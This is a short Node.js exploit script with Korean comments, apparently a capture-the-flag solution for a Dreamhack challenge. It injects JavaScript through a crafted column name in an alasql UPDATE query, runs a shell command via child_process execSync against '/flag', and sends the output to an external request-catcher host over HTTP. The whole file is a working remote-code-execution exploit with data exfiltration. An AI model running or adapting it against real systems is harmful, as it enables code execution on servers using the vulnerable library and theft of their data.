const alasql = require('alasql');

// 악성 페이로드 생성 함수
const genPayload = (command) => `
new Function(
    'return this.process.mainModule.require'
)()('child_process').execSync(${JSON.stringify(command)})
`;

// 공격 쿼리 실행
const res = alasql(
    // 데이터베이스 초기화
    'CREATE table i_am_a_table;' +
    `INSERT INTO i_am_a_table VALUES (1337);` +

    // 코드 주입
    `UPDATE i_am_a_table SET [0'+${genPayload("/flag")}+']=42;`
);

// 결과를 외부 서버로 전송
require('http').get(`https://kfvexex.request.dreamhack.games?result=${encodeURIComponent(JSON.stringify(res))}`);
